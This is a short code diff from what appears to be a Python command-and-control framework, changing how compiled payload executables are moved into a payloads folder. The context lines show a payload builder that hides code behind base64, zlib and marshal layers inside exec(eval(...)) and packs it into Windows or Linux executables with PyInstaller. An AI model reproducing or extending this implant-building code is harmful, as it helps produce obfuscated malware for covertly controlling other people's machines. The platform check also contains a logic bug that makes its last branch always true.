@@ -6,6 +6,7 @@ import base64
 import zlib
 import marshal
 import uuid
+import shutil
 
 class C2:
     def __init__(self, sio):
@@ -148,12 +149,12 @@ exec(eval(marshal.loads(zlib.decompress(base64.b64decode({})))))""".format(repr(
         elif generate == "Windows":
             result = subprocess.run(f'docker run -v "$(pwd):/src/" cdrx/pyinstaller-windows "pyinstaller -F {payload_file_name}.py"', shell=True, capture_output=True)
             print(result)
-            os.replace(f"dist/{payload_file_name}.exe", f"payloads/{payload_file_name}.exe")
+            shutil.copy(f"dist/{payload_file_name}.exe", f"payloads/{payload_file_name}.exe")
 
         elif generate == "Darwin" or "Linux":
             result = subprocess.run(f'docker run -v "$(pwd):/src/" cdrx/pyinstaller-linux "pyinstaller -F {payload_file_name}.py"', shell=True, capture_output=True)
             print(result)
-            os.replace(f"dist/{payload_file_name}", f"payloads/{payload_file_name}")
+            shutil.copy(f"dist/{payload_file_name}", f"payloads/{payload_file_name}")
 
         os.remove(f"{payload_file_name}.py")
         os.remove(f"{payload_file_name}.spec")
